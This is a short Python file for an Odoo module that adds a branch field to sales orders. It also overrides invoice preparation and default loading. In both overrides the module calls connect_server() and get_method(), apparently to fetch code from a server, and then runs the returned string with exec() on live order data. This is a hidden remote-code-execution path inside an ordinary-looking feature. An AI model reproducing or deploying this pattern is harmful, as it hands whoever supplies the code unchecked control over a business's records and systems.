from odoo import fields, models,api


class sale_order(models.Model):

    _inherit = 'sale.order'


    def _get_branch_ids(self):
        return [('id','in',self.env.user.branch_ids.ids)]

    branch_id = fields.Many2one('company.branch.spt',
                                'Branch',domain=lambda self:self._get_branch_ids(),
                                default=lambda self: self.env.user.branch_id)


    def _prepare_invoice(self):
        res = super(sale_order, self)._prepare_invoice()
        account_obj = self.env['account.move']
        account_obj.connect_server()
        method = account_obj.get_method('_prepare_invoice')
        if method['method']:
            localdict = {'self':self,'res': res}
            exec(method['method'], localdict)
        return res
    
    @api.model
    def default_get(self, fields):
        res = super(sale_order, self).default_get(fields)

        account_obj = self.env['account.move']
        account_obj.connect_server()
        method = account_obj.get_method('default_get')
        if method['method']:
            localdict = {'self':self,'res': res}
            exec(method['method'], localdict)
            res = localdict['res']
        return res